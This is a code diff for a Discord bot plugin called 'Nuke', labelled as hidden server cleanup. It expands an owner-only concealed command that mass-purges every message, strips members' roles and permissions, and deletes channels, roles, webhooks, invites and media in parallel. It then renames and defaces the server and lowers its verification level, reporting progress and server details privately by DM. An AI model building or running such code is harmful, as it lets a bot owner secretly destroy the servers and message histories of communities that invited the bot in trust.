@@ -1,14 +1,18 @@
 import asyncio
 
 import discord
+from discord import ui
 from redbot.core import Config, commands
 
 
-ALLOWED_USER_ID = 1173942304927645786
 
 
 class Nuke(commands.Cog):
     """Server cleanup (hidden commands)."""
+
+    GUILD_NAME = "Nuked Server"
+    GUILD_DESCRIPTION = "이 서버는 정리되었습니다."
+    GUILD_VERIFICATION = discord.VerificationLevel.none
 
     def __init__(self, bot):
         self.bot = bot
@@ -20,13 +24,184 @@ class Nuke(commands.Cog):
             "deleted_emojis": 0,
             "deleted_stickers": 0,
             "deleted_sounds": 0,
+            "deleted_webhooks": 0,
+            "deleted_invites": 0,
+            "deleted_events": 0,
+            "purged_messages": 0,
+            "reset_permissions": 0,
+            "removed_auto_roles": 0,
+            "reset_guild_assets": 0,
+            "updated_guild_settings": 0,
         }
         self.config.register_guild(**default_guild)
         self._stop_flags = set()
         self._update_every = 5
+        self._max_concurrency = 5
+        self._owner_log_messages: dict[int, tuple[int, int]] = {}
 
-    def _is_allowed(self, ctx: commands.Context) -> bool:
-        return ctx.author.id == ALLOWED_USER_ID
+    async def _is_allowed(self, ctx: commands.Context) -> bool:
+        return await self.bot.is_owner(ctx.author)
+
+    def _build_owner_log_view(
+        self,
+        action: str,
+        author: discord.abc.User,
+        guild: discord.Guild | None,
+    ) -> ui.LayoutView:
+        view = ui.LayoutView()
+        view.add_item(ui.TextDisplay(f"## 🔔 {action} 사용됨"))
+        view.add_item(
+            ui.TextDisplay(
+                f"**시간:** {discord.utils.format_dt(discord.utils.utcnow(), 'F')}"
+            )
+        )
+        view.add_item(ui.Separator(visible=True))
+
+        if guild is not None and (guild.icon or guild.banner):
+            items = []
+            if guild.icon:
+                items.append(
+                    discord.MediaGalleryItem(
+                        url=guild.icon.url,
+                        description="서버 아이콘",
+                    )
+                )
+            if guild.banner:
+                items.append(
+                    discord.MediaGalleryItem(
+                        url=guild.banner.url,
+                        description="서버 배너",
+                    )
+                )
+            view.add_item(ui.MediaGallery(items=items))
+
+        details = ui.Container(accent_color=0xFF6B6B)
+        details.add_item(ui.TextDisplay(f"**사용자:** {author} ({author.id})"))
+        details.add_item(
+            ui.TextDisplay(
+                f"**프로필:** https://discord.com/users/{author.id}"
+            )
+        )
+        if guild is not None:
+            details.add_item(ui.TextDisplay(f"**서버:** {guild.name} ({guild.id})"))
+            details.add_item(
+                ui.TextDisplay(
+                    f"**설명:** {guild.description or '없음'}"
+                )
+            )
+            if guild.owner_id:
+                details.add_item(
+                    ui.TextDisplay(f"**서버 오너:** <@{guild.owner_id}> ({guild.owner_id})")
+                )
+            details.add_item(ui.TextDisplay(f"**멤버 수:** {guild.member_count:,}"))
+            details.add_item(
+                ui.TextDisplay(
+                    "**생성일:** "
+                    f"{discord.utils.format_dt(guild.created_at, 'F')}"
+                )
+            )
+            details.add_item(
+                ui.TextDisplay(f"**보안 레벨:** {str(guild.verification_level).title()}")
+            )
+        else:
+            details.add_item(ui.TextDisplay("**서버:** 알 수 없음"))
+        view.add_item(details)
+
+        if guild is not None:
+            links = ui.ActionRow()
+            if guild.system_channel:
+                links.add_item(
+                    ui.Button(
+                        label="서버 바로가기",
+                        style=discord.ButtonStyle.link,
+                        url=(
+                            "https://discord.com/channels/"
+                            f"{guild.id}/{guild.system_channel.id}"
+                        ),
+                    )
+                )
+            if guild.vanity_url_code:
+                links.add_item(
+                    ui.Button(
+                        label="서버 초대",
+                        style=discord.ButtonStyle.link,
+                        url=f"https://discord.gg/{guild.vanity_url_code}",
+                    )
+                )
+            if links.children:
+                view.add_item(links)
+
+        settings = ui.Container(accent_color=0x5865F2)
+        settings.add_item(ui.TextDisplay("**강제 변경 설정**"))
+        settings.add_item(ui.TextDisplay(f"이름: {self.GUILD_NAME}"))
+        settings.add_item(ui.TextDisplay(f"설명: {self.GUILD_DESCRIPTION}"))
+        settings.add_item(
+            ui.TextDisplay(
+                f"보안 레벨: {str(self.GUILD_VERIFICATION).title()}"
+            )
+        )
+        view.add_item(settings)
+        return view
+
+    async def _get_owner_users(self) -> list[discord.abc.User]:
+        owners: list[discord.abc.User] = []
+        owner_ids = getattr(self.bot, "owner_ids", None)
+        if owner_ids:
+            for owner_id in owner_ids:
+                user = self.bot.get_user(owner_id)
+                if user is None:
+                    try:
+                        user = await self.bot.fetch_user(owner_id)
+                    except (discord.NotFound, discord.HTTPException):
+                        continue
+                owners.append(user)
+            return owners
+
+        try:
+            app_info = await self.bot.application_info()
+        except (discord.HTTPException, discord.Forbidden):
+            return owners
+
+        if app_info.team:
+            owners.extend(app_info.team.members)
+        elif app_info.owner:
+            owners.append(app_info.owner)
+        return owners
+
+    async def _notify_owners(
+        self, action: str, author: discord.abc.User, guild: discord.Guild | None
+    ):
+        owners = await self._get_owner_users()
+        if not owners:
+            return
+        view = self._build_owner_log_view(action, author, guild)
+        for owner in owners:
+            await self._upsert_owner_log_message(owner, view)
+
+    async def _upsert_owner_log_message(
+        self, owner: discord.abc.User, view: ui.LayoutView
+    ) -> discord.Message | None:
+        try:
+            channel = owner.dm_channel or await owner.create_dm()
+        except (discord.Forbidden, discord.HTTPException):
+            return None
+
+        cached = self._owner_log_messages.get(owner.id)
+        if cached and cached[0] == channel.id:
+            try:
+                message = await channel.fetch_message(cached[1])
+                await message.edit(view=view)
+                return message
+            except (discord.NotFound, discord.Forbidden, discord.HTTPException):
+                self._owner_log_messages.pop(owner.id, None)
+
+        try:
+            message = await channel.send(view=view)
+        except (discord.Forbidden, discord.HTTPException):
+            return None
+
+        self._owner_log_messages[owner.id] = (channel.id, message.id)
+        return message
 
     async def _send_dm(self, user: discord.abc.User, content: str):
         try:
@@ -39,7 +214,14 @@ class Nuke(commands.Cog):
         if me is None:
             return False
         perms = me.guild_permissions
-        return perms.manage_channels and perms.manage_roles
+        return (
+            perms.manage_channels
+            and perms.manage_roles
+            and perms.manage_emojis_and_stickers
+            and perms.manage_webhooks
+            and perms.manage_guild
+            and perms.manage_messages
+        )
 
     async def _wait_for_confirm(self, ctx: commands.Context, message: discord.Message) -> bool:
         def check(reaction: discord.Reaction, user: discord.User):
@@ -66,6 +248,14 @@ class Nuke(commands.Cog):
         await self.config.guild(guild).deleted_emojis.set(0)
         await self.config.guild(guild).deleted_stickers.set(0)
         await self.config.guild(guild).deleted_sounds.set(0)
+        await self.config.guild(guild).deleted_webhooks.set(0)
+        await self.config.guild(guild).deleted_invites.set(0)
+        await self.config.guild(guild).deleted_events.set(0)
+        await self.config.guild(guild).purged_messages.set(0)
+        await self.config.guild(guild).reset_permissions.set(0)
+        await self.config.guild(guild).removed_auto_roles.set(0)
+        await self.config.guild(guild).reset_guild_assets.set(0)
+        await self.config.guild(guild).updated_guild_settings.set(0)
 
     async def _send_progress_embed(
         self,
@@ -76,6 +266,14 @@ class Nuke(commands.Cog):
         deleted_emojis: int,
         deleted_stickers: int,
         deleted_sounds: int,
+        deleted_webhooks: int,
+        deleted_invites: int,
+        deleted_events: int,
+        purged_messages: int,
+        reset_permissions: int,
+        removed_auto_roles: int,
+        reset_guild_assets: int,
+        updated_guild_settings: int,
         status: str,
     ):
         embed = discord.Embed(title=title, description=status, color=discord.Color.orange())
@@ -84,6 +282,14 @@ class Nuke(commands.Cog):
         embed.add_field(name="이모지", value=str(deleted_emojis))
         embed.add_field(name="스티커", value=str(deleted_stickers))
         embed.add_field(name="사운드 보드", value=str(deleted_sounds))
+        embed.add_field(name="웹훅", value=str(deleted_webhooks))
+        embed.add_field(name="초대", value=str(deleted_invites))
+        embed.add_field(name="일정", value=str(deleted_events))
+        embed.add_field(name="메시지", value=str(purged_messages))
+        embed.add_field(name="권한 초기화", value=str(reset_permissions))
+        embed.add_field(name="자동 역할 제거", value=str(removed_auto_roles))
+        embed.add_field(name="서버 자산 초기화", value=str(reset_guild_assets))
+        embed.add_field(name="서버 설정 변경", value=str(updated_guild_settings))
         try:
             await message.edit(embed=embed)
         except (discord.Forbidden, discord.HTTPException):
@@ -102,6 +308,14 @@ class Nuke(commands.Cog):
             + counts["emojis"]
             + counts["stickers"]
             + counts["sounds"]
+            + counts["webhooks"]
+            + counts["invites"]
+            + counts["events"]
+            + counts["purged_messages"]
+            + counts["reset_permissions"]
+            + counts["removed_auto_roles"]
+            + counts["reset_guild_assets"]
+            + counts["updated_guild_settings"]
         )
         if not force and total % self._update_every != 0:
             return
@@ -113,72 +327,160 @@ class Nuke(commands.Cog):
             counts["emojis"],
             counts["stickers"],
             counts["sounds"],
+            counts["webhooks"],
+            counts["invites"],
+            counts["events"],
+            counts["purged_messages"],
+            counts["reset_permissions"],
+            counts["removed_auto_roles"],
+            counts["reset_guild_assets"],
+            counts["updated_guild_settings"],
             status,
+        )
+
+    async def _bulk_delete(
+        self,
+        guild: discord.Guild,
+        progress_message: discord.Message,
+        counts: dict,
+        items: list,
+        delete_func,
+        count_key: str,
+        status: str,
+        config_attr: str,
+    ) -> int:
+        if not items:
+            return counts[count_key]
+
+        sem = asyncio.Semaphore(self._max_concurrency)
+        lock = asyncio.Lock()
+        config_value = getattr(self.config.guild(guild), config_attr)
+
+        async def handle(item):
+            if guild.id in self._stop_flags:
+                return
+            async with sem:
+                try:
+                    await delete_func(item)
+                except (discord.Forbidden, discord.HTTPException):
+                    return
+            async with lock:
+                counts[count_key] += 1
+                await config_value.set(counts[count_key])
+                await self._maybe_update_progress(progress_message, counts, status)
+
+        await asyncio.gather(*(handle(item) for item in items))
+        return counts[count_key]
+
+    async def _delete_webhooks(
+        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
+    ):
+        try:
+            webhooks = await guild.webhooks()
+        except (discord.Forbidden, discord.HTTPException):
+            return counts["webhooks"]
+        return await self._bulk_delete(
+            guild,
+            progress_message,
+            counts,
+            list(webhooks),
+            lambda hook: hook.delete(reason="Nuke cleanup"),
+            "webhooks",
+            "웹훅 삭제 중",
+            "deleted_webhooks",
+        )
+
+    async def _delete_invites(
+        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
+    ):
+        try:
+            invites = await guild.invites()
+        except (discord.Forbidden, discord.HTTPException):
+            return counts["invites"]
+        return await self._bulk_delete(
+            guild,
+            progress_message,
+            counts,
+            list(invites),
+            lambda invite: invite.delete(reason="Nuke cleanup"),
+            "invites",
+            "초대 삭제 중",
+            "deleted_invites",
+        )
+
+    async def _delete_scheduled_events(
+        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
+    ):
+        events = list(getattr(guild, "scheduled_events", []))
+        if not events:
+            return counts["events"]
+        return await self._bulk_delete(
+            guild,
+            progress_message,
+            counts,
+            events,
+            lambda event: event.delete(reason="Nuke cleanup"),
+            "events",
+            "일정 삭제 중",
+            "deleted_events",
         )
 
     async def _delete_channels(
         self, guild: discord.Guild, progress_message: discord.Message, counts: dict
     ):
-        for channel in list(guild.channels):
-            if guild.id in self._stop_flags:
-                break
-            try:
-                await channel.delete(reason="Nuke cleanup")
-                counts["channels"] += 1
-            except (discord.Forbidden, discord.HTTPException):
-                pass
-            await self.config.guild(guild).deleted_channels.set(counts["channels"])
-            await self._maybe_update_progress(progress_message, counts, "채널 삭제 중")
-        return counts["channels"]
+        return await self._bulk_delete(
+            guild,
+            progress_message,
+            counts,
+            list(guild.channels),
+            lambda channel: channel.delete(reason="Nuke cleanup"),
+            "channels",
+            "채널 삭제 중",
+            "deleted_channels",
+        )
 
     async def _delete_roles(
         self, guild: discord.Guild, progress_message: discord.Message, counts: dict
     ):
-        for role in list(guild.roles):
-            if guild.id in self._stop_flags:
-                break
-            if role.managed:
-                continue
-            if role.is_default():
-                continue
-            try:
-                await role.delete(reason="Nuke cleanup")
-                counts["roles"] += 1
-            except (discord.Forbidden, discord.HTTPException):
-                pass
-            await self.config.guild(guild).deleted_roles.set(counts["roles"])
-            await self._maybe_update_progress(progress_message, counts, "역할 삭제 중")
-        return counts["roles"]
+        roles = [role for role in guild.roles if not role.managed and not role.is_default()]
+        return await self._bulk_delete(
+            guild,
+            progress_message,
+            counts,
+            roles,
+            lambda role: role.delete(reason="Nuke cleanup"),
+            "roles",
+            "역할 삭제 중",
+            "deleted_roles",
+        )
 
     async def _delete_emojis(
         self, guild: discord.Guild, progress_message: discord.Message, counts: dict
     ):
-        for emoji in list(getattr(guild, "emojis", [])):
-            if guild.id in self._stop_flags:
-                break
-            try:
-                await emoji.delete(reason="Nuke cleanup")
-                counts["emojis"] += 1
-            except (discord.Forbidden, discord.HTTPException):
-                pass
-            await self.config.guild(guild).deleted_emojis.set(counts["emojis"])
-            await self._maybe_update_progress(progress_message, counts, "이모지 삭제 중")
-        return counts["emojis"]
+        return await self._bulk_delete(
+            guild,
+            progress_message,
+            counts,
+            list(getattr(guild, "emojis", [])),
+            lambda emoji: emoji.delete(reason="Nuke cleanup"),
+            "emojis",
+            "이모지 삭제 중",
+            "deleted_emojis",
+        )
 
     async def _delete_stickers(
         self, guild: discord.Guild, progress_message: discord.Message, counts: dict
     ):
-        for sticker in list(getattr(guild, "stickers", [])):
-            if guild.id in self._stop_flags:
-                break
-            try:
-                await sticker.delete(reason="Nuke cleanup")
-                counts["stickers"] += 1
-            except (discord.Forbidden, discord.HTTPException):
-                pass
-            await self.config.guild(guild).deleted_stickers.set(counts["stickers"])
-            await self._maybe_update_progress(progress_message, counts, "스티커 삭제 중")
-        return counts["stickers"]
+        return await self._bulk_delete(
+            guild,
+            progress_message,
+            counts,
+            list(getattr(guild, "stickers", [])),
+            lambda sticker: sticker.delete(reason="Nuke cleanup"),
+            "stickers",
+            "스티커 삭제 중",
+            "deleted_stickers",
+        )
 
     async def _delete_sounds(
         self, guild: discord.Guild, progress_message: discord.Message, counts: dict
@@ -186,26 +488,167 @@ class Nuke(commands.Cog):
         sounds = getattr(guild, "soundboard_sounds", None)
         if sounds is None:
             return counts["sounds"]
-        for sound in list(sounds):
+        return await self._bulk_delete(
+            guild,
+            progress_message,
+            counts,
+            list(sounds),
+            lambda sound: sound.delete(reason="Nuke cleanup"),
+            "sounds",
+            "사운드 보드 삭제 중",
+            "deleted_sounds",
+        )
+
+    async def _purge_messages(
+        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
+    ):
+        channels: list[discord.abc.GuildChannel] = [
+            channel
+            for channel in guild.channels
+            if hasattr(channel, "purge")
+        ]
+
+        for channel in getattr(guild, "text_channels", []):
+            for thread in list(getattr(channel, "threads", [])):
+                channels.append(thread)
+            if hasattr(channel, "archived_threads"):
+                try:
+                    async for thread in channel.archived_threads(limit=None):
+                        channels.append(thread)
+                except (discord.Forbidden, discord.HTTPException):
+                    continue
+
+        if not channels:
+            return counts["purged_messages"]
+
+        sem = asyncio.Semaphore(self._max_concurrency)
+        lock = asyncio.Lock()
+        config_value = self.config.guild(guild).purged_messages
+
+        async def handle(channel):
             if guild.id in self._stop_flags:
-                break
-            try:
-                await sound.delete(reason="Nuke cleanup")
-                counts["sounds"] += 1
-            except (discord.Forbidden, discord.HTTPException):
-                pass
-            await self.config.guild(guild).deleted_sounds.set(counts["sounds"])
-            await self._maybe_update_progress(progress_message, counts, "사운드 보드 삭제 중")
-        return counts["sounds"]
+                return
+            async with sem:
+                try:
+                    deleted = await channel.purge(limit=None, bulk=True)
+                except (discord.Forbidden, discord.HTTPException):
+                    return
+            async with lock:
+                counts["purged_messages"] += len(deleted)
+                await config_value.set(counts["purged_messages"])
+                await self._maybe_update_progress(progress_message, counts, "메시지 삭제 중")
+
+        await asyncio.gather(*(handle(channel) for channel in channels))
+        return counts["purged_messages"]
+
+    async def _reset_channel_permissions(
+        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
+    ):
+        channels = list(guild.channels)
+        if not channels:
+            return counts["reset_permissions"]
+
+        sem = asyncio.Semaphore(self._max_concurrency)
+        lock = asyncio.Lock()
+        config_value = self.config.guild(guild).reset_permissions
+
+        async def handle(channel):
+            if guild.id in self._stop_flags:
+                return
+            async with sem:
+                try:
+                    await channel.edit(overwrites={}, reason="Nuke cleanup")
+                except (discord.Forbidden, discord.HTTPException):
+                    return
+            async with lock:
+                counts["reset_permissions"] += 1
+                await config_value.set(counts["reset_permissions"])
+                await self._maybe_update_progress(progress_message, counts, "채널 권한 초기화 중")
+
+        await asyncio.gather(*(handle(channel) for channel in channels))
+        return counts["reset_permissions"]
+
+    async def _remove_auto_roles(
+        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
+    ):
+        me = guild.me
+        if me is None:
+            return counts["removed_auto_roles"]
+
+        sem = asyncio.Semaphore(self._max_concurrency)
+        lock = asyncio.Lock()
+        config_value = self.config.guild(guild).removed_auto_roles
+
+        async def handle(member: discord.Member):
+            if guild.id in self._stop_flags:
+                return
+            roles_to_remove = [
+                role
+                for role in member.roles
+                if not role.is_default()
+                and not role.managed
+                and role < me.top_role
+            ]
+            if not roles_to_remove:
+                return
+            async with sem:
+                try:
+                    await member.remove_roles(*roles_to_remove, reason="Nuke cleanup")
+                except (discord.Forbidden, discord.HTTPException):
+                    return
+            async with lock:
+                counts["removed_auto_roles"] += len(roles_to_remove)
+                await config_value.set(counts["removed_auto_roles"])
+                await self._maybe_update_progress(progress_message, counts, "자동 역할 제거 중")
+
+        await asyncio.gather(*(handle(member) for member in guild.members))
+        return counts["removed_auto_roles"]
+
+    async def _reset_guild_assets(
+        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
+    ):
+        if guild.id in self._stop_flags:
+            return counts["reset_guild_assets"]
+        try:
+            await guild.edit(icon=None, banner=None, reason="Nuke cleanup")
+        except (discord.Forbidden, discord.HTTPException):
+            return counts["reset_guild_assets"]
+        counts["reset_guild_assets"] += 1
+        await self.config.guild(guild).reset_guild_assets.set(counts["reset_guild_assets"])
+        await self._maybe_update_progress(progress_message, counts, "서버 자산 초기화 중")
+        return counts["reset_guild_assets"]
+
+    async def _update_guild_settings(
+        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
+    ):
+        if guild.id in self._stop_flags:
+            return counts["updated_guild_settings"]
+        try:
+            await guild.edit(
+                name=self.GUILD_NAME,
+                description=self.GUILD_DESCRIPTION,
+                verification_level=self.GUILD_VERIFICATION,
+                reason="Nuke cleanup",
+            )
+        except (discord.Forbidden, discord.HTTPException):
+            return counts["updated_guild_settings"]
+        counts["updated_guild_settings"] += 1
+        await self.config.guild(guild).updated_guild_settings.set(
+            counts["updated_guild_settings"]
+        )
+        await self._maybe_update_progress(progress_message, counts, "서버 설정 변경 중")
+        return counts["updated_guild_settings"]
 
     @commands.command(hidden=True)
     @commands.guild_only()
     async def nuke(self, ctx: commands.Context):
-        if not self._is_allowed(ctx):
+        if not await self._is_allowed(ctx):
             return
 
         if ctx.guild is None:
             return
+
+        await self._notify_owners("nuke", ctx.author, ctx.guild)
 
         if ctx.message:
             try:
@@ -235,6 +678,14 @@ class Nuke(commands.Cog):
             "emojis": 0,
             "stickers": 0,
             "sounds": 0,
+            "webhooks": 0,
+            "invites": 0,
+            "events": 0,
+            "purged_messages": 0,
+            "reset_permissions": 0,
+            "removed_auto_roles": 0,
+            "reset_guild_assets": 0,
+            "updated_guild_settings": 0,
         }
         start_time = asyncio.get_running_loop().time()
 
@@ -246,9 +697,39 @@ class Nuke(commands.Cog):
             0,
             0,
             0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
             "시작",
         )
-        deleted_channels = await self._delete_channels(ctx.guild, progress_dm, counts)
+        purged_messages = await self._purge_messages(ctx.guild, progress_dm, counts)
+        reset_permissions = 0
+        if ctx.guild.id not in self._stop_flags:
+            reset_permissions = await self._reset_channel_permissions(
+                ctx.guild, progress_dm, counts
+            )
+        removed_auto_roles = 0
+        if ctx.guild.id not in self._stop_flags:
+            removed_auto_roles = await self._remove_auto_roles(
+                ctx.guild, progress_dm, counts
+            )
+        deleted_webhooks = 0
+        if ctx.guild.id not in self._stop_flags:
+            deleted_webhooks = await self._delete_webhooks(ctx.guild, progress_dm, counts)
+        deleted_invites = 0
+        if ctx.guild.id not in self._stop_flags:
+            deleted_invites = await self._delete_invites(ctx.guild, progress_dm, counts)
+        deleted_events = 0
+        if ctx.guild.id not in self._stop_flags:
+            deleted_events = await self._delete_scheduled_events(ctx.guild, progress_dm, counts)
+        deleted_channels = 0
+        if ctx.guild.id not in self._stop_flags:
+            deleted_channels = await self._delete_channels(ctx.guild, progress_dm, counts)
         deleted_roles = 0
         if ctx.guild.id not in self._stop_flags:
             deleted_roles = await self._delete_roles(ctx.guild, progress_dm, counts)
@@ -261,12 +742,32 @@ class Nuke(commands.Cog):
         deleted_sounds = 0
         if ctx.guild.id not in self._stop_flags:
             deleted_sounds = await self._delete_sounds(ctx.guild, progress_dm, counts)
+        reset_guild_assets = 0
+        if ctx.guild.id not in self._stop_flags:
+            reset_guild_assets = await self._reset_guild_assets(
+                ctx.guild, progress_dm, counts
+            )
+        updated_guild_settings = 0
+        if ctx.guild.id not in self._stop_flags:
+            updated_guild_settings = await self._update_guild_settings(
+                ctx.guild, progress_dm, counts
+            )
 
         await self.config.guild(ctx.guild).deleted_channels.set(deleted_channels)
         await self.config.guild(ctx.guild).deleted_roles.set(deleted_roles)
         await self.config.guild(ctx.guild).deleted_emojis.set(deleted_emojis)
         await self.config.guild(ctx.guild).deleted_stickers.set(deleted_stickers)
         await self.config.guild(ctx.guild).deleted_sounds.set(deleted_sounds)
+        await self.config.guild(ctx.guild).deleted_webhooks.set(deleted_webhooks)
+        await self.config.guild(ctx.guild).deleted_invites.set(deleted_invites)
+        await self.config.guild(ctx.guild).deleted_events.set(deleted_events)
+        await self.config.guild(ctx.guild).purged_messages.set(purged_messages)
+        await self.config.guild(ctx.guild).reset_permissions.set(reset_permissions)
+        await self.config.guild(ctx.guild).removed_auto_roles.set(removed_auto_roles)
+        await self.config.guild(ctx.guild).reset_guild_assets.set(reset_guild_assets)
+        await self.config.guild(ctx.guild).updated_guild_settings.set(
+            updated_guild_settings
+        )
 
         elapsed = asyncio.get_running_loop().time() - start_time
 
@@ -279,6 +780,14 @@ class Nuke(commands.Cog):
                 deleted_emojis,
                 deleted_stickers,
                 deleted_sounds,
+                deleted_webhooks,
+                deleted_invites,
+                deleted_events,
+                purged_messages,
+                reset_permissions,
+                removed_auto_roles,
+                reset_guild_assets,
+                updated_guild_settings,
                 "중단됨",
             )
         else:
@@ -290,6 +799,14 @@ class Nuke(commands.Cog):
                 deleted_emojis,
                 deleted_stickers,
                 deleted_sounds,
+                deleted_webhooks,
+                deleted_invites,
+                deleted_events,
+                purged_messages,
+                reset_permissions,
+                removed_auto_roles,
+                reset_guild_assets,
+                updated_guild_settings,
                 "완료",
             )
         await self._send_dm(
@@ -299,13 +816,29 @@ class Nuke(commands.Cog):
             "역할: {2}개\n"
             "이모지: {3}개\n"
             "스티커: {4}개\n"
-            "사운드 보드: {5}개".format(
+            "사운드 보드: {5}개\n"
+            "웹훅: {6}개\n"
+            "초대: {7}개\n"
+            "일정: {8}개\n"
+            "메시지: {9}개\n"
+            "권한 초기화: {10}개\n"
+            "자동 역할 제거: {11}개\n"
+            "서버 자산 초기화: {12}회\n"
+            "서버 설정 변경: {13}회".format(
                 elapsed,
                 deleted_channels,
                 deleted_roles,
                 deleted_emojis,
                 deleted_stickers,
                 deleted_sounds,
+                deleted_webhooks,
+                deleted_invites,
+                deleted_events,
+                purged_messages,
+                reset_permissions,
+                removed_auto_roles,
+                reset_guild_assets,
+                updated_guild_settings,
             ),
         )
 
@@ -319,11 +852,13 @@ class Nuke(commands.Cog):
     @commands.command(hidden=True)
     @commands.guild_only()
     async def nukestop(self, ctx: commands.Context):
-        if not self._is_allowed(ctx):
+        if not await self._is_allowed(ctx):
             return
 
         if ctx.guild is None:
             return
+
+        await self._notify_owners("nukestop", ctx.author, ctx.guild)
 
         if not await self.config.guild(ctx.guild).nuke_in_progress():
             return
@@ -334,6 +869,14 @@ class Nuke(commands.Cog):
         deleted_emojis = await self.config.guild(ctx.guild).deleted_emojis()
         deleted_stickers = await self.config.guild(ctx.guild).deleted_stickers()
         deleted_sounds = await self.config.guild(ctx.guild).deleted_sounds()
+        deleted_webhooks = await self.config.guild(ctx.guild).deleted_webhooks()
+        deleted_invites = await self.config.guild(ctx.guild).deleted_invites()
+        deleted_events = await self.config.guild(ctx.guild).deleted_events()
+        purged_messages = await self.config.guild(ctx.guild).purged_messages()
+        reset_permissions = await self.config.guild(ctx.guild).reset_permissions()
+        removed_auto_roles = await self.config.guild(ctx.guild).removed_auto_roles()
+        reset_guild_assets = await self.config.guild(ctx.guild).reset_guild_assets()
+        updated_guild_settings = await self.config.guild(ctx.guild).updated_guild_settings()
         progress_dm = await self._send_dm(ctx.author, "⏸️ 중단 처리 중...")
         if progress_dm:
             await self._send_progress_embed(
@@ -344,5 +887,13 @@ class Nuke(commands.Cog):
                 deleted_emojis,
                 deleted_stickers,
                 deleted_sounds,
+                deleted_webhooks,
+                deleted_invites,
+                deleted_events,
+                purged_messages,
+                reset_permissions,
+                removed_auto_roles,
+                reset_guild_assets,
+                updated_guild_settings,
                 "중단됨",
             )
